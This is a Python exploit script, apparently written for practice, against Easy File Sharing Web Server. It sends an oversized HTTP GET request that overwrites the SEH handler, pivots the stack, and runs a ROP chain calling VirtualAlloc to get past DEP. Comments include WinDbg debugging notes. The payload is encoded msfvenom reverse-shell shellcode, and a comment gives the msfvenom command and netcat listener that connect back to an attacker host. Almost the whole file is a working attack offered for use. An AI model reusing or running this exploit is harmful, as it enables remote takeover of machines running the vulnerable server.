#!/usr/bin/python3

from struct import pack
import pwn
import socket
import sys

# Attach windbg to fsws.exe (no service, doesn't start automatically => restart manually after each crash)
# Restart with: taskkill /f /im fsws.exe ; & 'C:\EFS Software\Easy File Sharing Web Server\fsws.exe'

# 0:008> !nmod
# 10000000 10050000 ImageLoad            /SafeSEH OFF                C:\EFS Software\Easy File Sharing Web Server\ImageLoad.dll
# 61c00000 61c99000 sqlite3              /SafeSEH OFF                C:\EFS Software\Easy File Sharing Web Server\sqlite3.dll

# note that of these only sqlite3 is stable; the addresses of other modules vary
# => this exploits needs to be run multiple times until it works ...

# => DEP bypass would not be necessary, but let's do it just for practice
# manually enable DEP with:
#      Windows Defender Security Center
#   -> App & Browser Control
#   -> Exploit Protection Settings
#   -> Program Settings
#   -> Add program to customize
#   -> Choose exact file path
#   -> enter path
#   -> Data Execution Prevention (DEP): Override, On
# then restart program

def main() :
    server = sys.argv[1]
    payload = buildPayload()
    sendPayload(server, payload)


payloadSize = 0x5000

def buildPayload():
    # buf += pwn.cyclic(payloadSize)
    offBufSeh = 0xfe1                                           # pwn.cyclic_find(0x6261726f)

    # at point of SEH Override (first ROP gadget in the ROP chain),
    # we need something that places ESP somewhere in our input buffer
    offEspBufAtSEHOverride = 0x64f                              # this is the exact offset
    offEspGadget           = 0x1004                             # this is the offset available in the ROP gadget
    offBufBackjump         = offEspGadget - offEspBufAtSEHOverride

    badchars = b"\x00\x0a\x0d\x20\x25\x2f\x5c"
    # buf += bytes([ b for b in range(0x100)
    #                  if b not in badchars])

    buf  = b""

    buf += b"a" * (offBufBackjump - len(buf))                   # padding

    # buf += b"bbbb"
    buf += ropChainVirtualAlloc()                               # DEP bypass ROP chain; target of backjump of first ROP gadget

    tmpPaddingLen = offBufSeh - len(buf) - len(virtualAllocStub()) # padding (note: no -4!)
    assert tmpPaddingLen > 0, "ROP chain is too long to fit"
    buf += b"c" * tmpPaddingLen

    buf += virtualAllocStub()                                   # setup call to VirtualAlloc

    buf += pack("<I", 0x10022869)                               # add esp, 0x00001004; SEH override; backjump / first ROP gadget

    buf += nopsled()
    buf += shellcode()                                          # note: stack is now executable
    buf += b"z" * (payloadSize - len(buf))                      # padding to fixate payloadSize

    # some sanity checks
    assert len(buf) == payloadSize, f"Mismatching size: {len(buf)} != {payloadSize}"
    for b in badchars:
        assert b not in buf, print(f"Error: badchar {hex(b)} ({repr(chr(b))}) appeared in payload", "\n\n", pwn.hexdump(buf))

    return buf


def nopsled(length=0x10):
    return b"\x90" * length

def virtualAllocStub():
    buf  = b""
    buf += b"AAAA"      # Address of VirtualAlloc
    buf += b"BBBB"      # Return address                = address of shellcode on the stack
    buf += b"CCCC"      # LPVOID lpAddress              = address of shellcode on the stack
    buf += b"DDDD"      # SIZE_T dwSize                 = payloadSize should be enough
    buf += b"EEEE"      # DWORD  flAllocationType       = 0x1000 = MEM_COMMIT
    buf += b"FFFF"      # DWORD  flProtect              = 0x40 = PAGE_EXECUTE_READWRITE
    return buf

def ropChainVirtualAlloc():
    """Calls VirtualAlloc via ROP chain and then jumps into the next part of the exploit (shellcode)"""
    buf  = b""

    tmp1 = 0x77777777                                           # dummy value used for avoiding bad chars

    ################################################################################
    # align pointer register to begin of stub for calling VirtualAlloc on the stack

    # buf += pack("<I", 0x100240c2)                             # pushad
    buf += pack("<I", 0x1001b8be)                               # mov eax, ebp ; pop esi ; pop ebp
    buf += b"jjjj" * 2                                          # junk
    offEaxStub = 0x15f8
    buf += pack("<I", 0x10023115)                               # pop ecx
    buf += pack("<i", -offEaxStub)
    buf += pack("<I", 0x1001283e)                               # sub eax, ecx

    ################################################################################
    # compute address of VirtualAlloc

    # inspect Import Address Table (IAT) with WinDBG:
    # 0:000> !dh -a sqlite3 => search for KERNEL32.dll => dump IAT and take first entry:
    #   _IMAGE_IMPORT_DESCRIPTOR 61c83000
    #     KERNEL32.dll
    #               61C831C0 Import Address Table
    #               61C8303C Import Name Table
    #                      0 time date stamp
    #                      0 Index of first forwarder reference
    #
    #        775474E0   15 AreFileApisANSI
    # 0:000> dds 61C831C0 L1
    # 61c831c0  775474e0 KERNEL32!AreFileApisANSIStub
    areFileApisAnsiIAT = 0x775474e0

    # 0:000> .shell -ci "!dh -a kernel32" findstr /i AreFileApisANSI
    #         38   35 775474E0 AreFileApisANSI
    # 0:000> .shell -ci "!dh -a kernel32" findstr /i VirtualAlloc
    #       1471 1470 775438C0 VirtualAlloc
    offArefileapisansiVirtualalloc = 0x775438C0 - 0x775474E0

    buf += ropBackupEax()
    buf += pack("<I", 0x10015442)                               # pop eax
    buf += pack("<I", areFileApisAnsiIAT)
    buf += pack("<I", 0x10023115)                               # pop ecx
    buf += pack("<i", -(offArefileapisansiVirtualalloc + tmp1))
    buf += pack("<I", 0x1001641c)                               # sub eax, ecx
    buf += pack("<I", 0x10023115)                               # pop ecx
    buf += pack("<i", -(-tmp1))
    buf += pack("<I", 0x1001641c)                               # sub eax, ecx
    buf += ropMovEcxEax()
    buf += ropRestoreEax()

    ################################################################################
    # patch address of VirtualAlloc
    buf += pack("<I", 0x10010118)                               # mov  [eax], ecx

    ################################################################################
    # compute address of shellcode
    offEaxShellcode = 0x2C

    # eax += offEaxShellcode
    buf += pack("<I", 0x10023115)                               # pop ecx
    buf += pack("<i", -offEaxShellcode)
    buf += pack("<I", 0x1001641c)                               # sub eax, ecx

    buf += ropMovEcxEax()

    # eax -= offEaxShellcode
    buf += ropMovEdx(offEaxShellcode + tmp1)
    buf += pack("<I", 0x1001bf44)                               # sub eax, edx ; pop edi ; pop esi ; pop ebp ; pop ebx
    buf += b"jjjj" * 4                                          # junk
    buf += ropMovEdx(0xffffffff+1 - tmp1)
    buf += pack("<I", 0x1001bf44)                               # sub eax, edx ; pop edi ; pop esi ; pop ebp ; pop ebx
    buf += b"jjjj" * 4                                          # junk

    ################################################################################
    # patch return address (address of shellcode)
    buf += pack("<I", 0x10022199) * 4                           # inc eax
    buf += pack("<I", 0x10010118)                               # mov  [eax], ecx

    ################################################################################
    # patch lpAddress (address of shellcode)
    buf += pack("<I", 0x10022199) * 4                           # inc eax
    buf += pack("<I", 0x10010118)                               # mov  [eax], ecx

    ################################################################################
    # patch dwSize

    buf += ropBackupEax()
    buf += pack("<I", 0x10015442)                               # pop eax
    buf += pack("<I", payloadSize + tmp1)
    buf += pack("<I", 0x10023115)                               # pop ecx
    buf += pack("<i", tmp1)
    buf += pack("<I", 0x1001641c)                               # sub eax, ecx
    buf += ropMovEcxEax()
    buf += ropRestoreEax()

    buf += pack("<I", 0x10022199) * 4                           # inc eax
    buf += pack("<I", 0x10010118)                               # mov  [eax], ecx

    ################################################################################
    # patch flAllocationType

    MEM_COMMIT = 0x1000
    buf += ropBackupEax()
    buf += pack("<I", 0x10015442)                               # pop eax
    buf += pack("<I", MEM_COMMIT + tmp1)
    buf += pack("<I", 0x10023115)                               # pop ecx
    buf += pack("<i", tmp1)
    buf += pack("<I", 0x1001641c)                               # sub eax, ecx
    buf += ropMovEcxEax()
    buf += ropRestoreEax()

    buf += pack("<I", 0x10022199) * 4                           # inc eax
    buf += pack("<I", 0x10010118)                               # mov  [eax], ecx

    ################################################################################
    # patch flProtect

    PAGE_EXECUTE_READWRITE = 0x40
    buf += ropBackupEax()
    buf += pack("<I", 0x10015442)                               # pop eax
    buf += pack("<I", PAGE_EXECUTE_READWRITE + tmp1)
    buf += pack("<I", 0x10023115)                               # pop ecx
    buf += pack("<i", tmp1)
    buf += pack("<I", 0x1001641c)                               # sub eax, ecx
    buf += ropMovEcxEax()
    buf += ropRestoreEax()

    buf += pack("<I", 0x10022199) * 4                           # inc eax
    buf += pack("<I", 0x10010118)                               # mov  [eax], ecx

    ################################################################################
    # stack pivot

        # align eax to VirtualAlloc stack frame
    buf += pack("<I", 0x10023115)                               # pop ecx
    buf += pack("<I", len(virtualAllocStub()) - 4 + tmp1)
    buf += pack("<I", 0x1001283e)                               # sub eax, ecx
    buf += pack("<I", 0x10023115)                               # pop ecx
    buf += pack("<i", -tmp1)
    buf += pack("<I", 0x1001283e)                               # sub eax, ecx

    # buf += pack("<I", 0x61c7230e)                             # int3 (debug gadget)

    # 0:006> dds @eax L6
    # 04ba6f90  775438c0 KERNEL32!VirtualAllocStub
    # 04ba6f94  04ba6fbc
    # 04ba6f98  04ba6fbc
    # 04ba6f9c  00005000
    # 04ba6fa0  00001000
    # 04ba6fa4  00000040

        # actually pivot
    buf += pack("<I", 0x61c6bb76)                               # xchg eax, esp

    # page protections on shellcode before:
    # 0:006> !vprot 04ca6fbc
    # BaseAddress:       04ca6000
    # AllocationBase:    04bc0000
    # AllocationProtect: 00000004  PAGE_READWRITE
    # RegionSize:        0001a000
    # State:             00001000  MEM_COMMIT
    # Protect:           00000004  PAGE_READWRITE
    # Type:              00020000  MEM_PRIVATE

    # page protections on shellcode after: (`~. pt`)
    # 0:006> !vprot 04c36fbc
    # BaseAddress:       04c36000
    # AllocationBase:    04b50000
    # AllocationProtect: 00000004  PAGE_READWRITE
    # RegionSize:        00006000
    # State:             00001000  MEM_COMMIT
    # Protect:           00000040  PAGE_EXECUTE_READWRITE
    # Type:              00020000  MEM_PRIVATE

    return buf

def ropBackupEax():
    """Backup EAX to EBP (without modifying ECX)"""
    buf  = pack("<I", 0x61c373a4) * 2                           # pop edi
    buf += pack("<I", 0x10016468)                               # mov ebp, eax ; call edi (backup eax)
    return buf

def ropRestoreEax():
    """Restore EAX from EBP (without modifying ECX)"""
    buf  = pack("<I", 0x1001b8be)                               # mov eax, ebp ; pop esi ; pop ebp (restore eax)
    buf += b"jjjj" * 2                                          # junk
    return buf

def ropMovEcxEax():
    buf  = pack("<I", 0x10024632)                               # pop esi
    buf += pack("<I", 0x10023114)                               # pop ebx ; pop ecx
                                                                #   first pop removes saved EIP from call
                                                                #   second pop places desired value (pushed eax) into ecx
    buf += pack("<I", 0x100235d0)                               # push eax ; call esi
    return buf

def ropMovEdx(val):
    buf  = pack("<I", 0x10022c4c)                               # xor edx, edx
    buf += pack("<I", 0x100248e0)                               # pop ebx
    buf += pack("<I", val)
    buf += pack("<I", 0x10022c1e)                               # add edx, ebx ; pop ebx ; retn 0x0010
    buf += b"jjjj"                                              #   junk (ebx)
    buf += pack("<I", 0x61c721f2)                               # ret (= ROP nop)
    buf += b"j" * 0x10                                          #   junk (retn)
    return buf

def shellcode():
    buf  = b""

    # buf += b"\xcc" * 4

    # note: the encoders x86/shikata_ga_nai and x86/xor_dynamic failed somehow; idk why...; this one worked first try
    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.204 LPORT=443 -f python -b "\x00\x0a\x0d\x20\x25\x2f\x5c" -e x86/call4_dword_xor
    # nc -vlnp 443
    buf += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
    buf += b"\x81\x76\x0e\xb7\xb2\xaa\x9f\x83\xee\xfc\xe2\xf4"
    buf += b"\x4b\x5a\x28\x9f\xb7\xb2\xca\x16\x52\x83\x6a\xfb"
    buf += b"\x3c\xe2\x9a\x14\xe5\xbe\x21\xcd\xa3\x39\xd8\xb7"
    buf += b"\xb8\x05\xe0\xb9\x86\x4d\x06\xa3\xd6\xce\xa8\xb3"
    buf += b"\x97\x73\x65\x92\xb6\x75\x48\x6d\xe5\xe5\x21\xcd"
    buf += b"\xa7\x39\xe0\xa3\x3c\xfe\xbb\xe7\x54\xfa\xab\x4e"
    buf += b"\xe6\x39\xf3\xbf\xb6\x61\x21\xd6\xaf\x51\x90\xd6"
    buf += b"\x3c\x86\x21\x9e\x61\x83\x55\x33\x76\x7d\xa7\x9e"
    buf += b"\x70\x8a\x4a\xea\x41\xb1\xd7\x67\x8c\xcf\x8e\xea"
    buf += b"\x53\xea\x21\xc7\x93\xb3\x79\xf9\x3c\xbe\xe1\x14"
    buf += b"\xef\xae\xab\x4c\x3c\xb6\x21\x9e\x67\x3b\xee\xbb"
    buf += b"\x93\xe9\xf1\xfe\xee\xe8\xfb\x60\x57\xed\xf5\xc5"
    buf += b"\x3c\xa0\x41\x12\xea\xda\x99\xad\xb7\xb2\xc2\xe8"
    buf += b"\xc4\x80\xf5\xcb\xdf\xfe\xdd\xb9\xb0\x4d\x7f\x27"
    buf += b"\x27\xb3\xaa\x9f\x9e\x76\xfe\xcf\xdf\x9b\x2a\xf4"
    buf += b"\xb7\x4d\x7f\xcf\xe7\xe2\xfa\xdf\xe7\xf2\xfa\xf7"
    buf += b"\x5d\xbd\x75\x7f\x48\x67\x3d\xf5\xb2\xda\x6a\x37"
    buf += b"\x9a\x7e\xc2\x9d\xb7\xb3\x11\x16\x51\xd8\xba\xc9"
    buf += b"\xe0\xda\x33\x3a\xc3\xd3\x55\x4a\x32\x72\xde\x93"
    buf += b"\x48\xfc\xa2\xea\x5b\xda\x5a\x2a\x15\xe4\x55\x4a"
    buf += b"\xdf\xd1\xc7\xfb\xb7\x3b\x49\xc8\xe0\xe5\x9b\x69"
    buf += b"\xdd\xa0\xf3\xc9\x55\x4f\xcc\x58\xf3\x96\x96\x9e"
    buf += b"\xb6\x3f\xee\xbb\xa7\x74\xaa\xdb\xe3\xe2\xfc\xc9"
    buf += b"\xe1\xf4\xfc\xd1\xe1\xe4\xf9\xc9\xdf\xcb\x66\xa0"
    buf += b"\x31\x4d\x7f\x16\x57\xfc\xfc\xd9\x48\x82\xc2\x97"
    buf += b"\x30\xaf\xca\x60\x62\x09\x5a\x2a\x15\xe4\xc2\x39"
    buf += b"\x22\x0f\x37\x60\x62\x8e\xac\xe3\xbd\x32\x51\x7f"
    buf += b"\xc2\xb7\x11\xd8\xa4\xc0\xc5\xf5\xb7\xe1\x55\x4a"

    buf += b"\x90\x90\xeb\xfe"

    return buf


def sendPayload(server, payload):
    buf = b"GET " + payload + b" HTTP/1.1\r\n"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server, 80))
    s.send(buf)
    s.close()


if __name__ == "__main__":
    main()
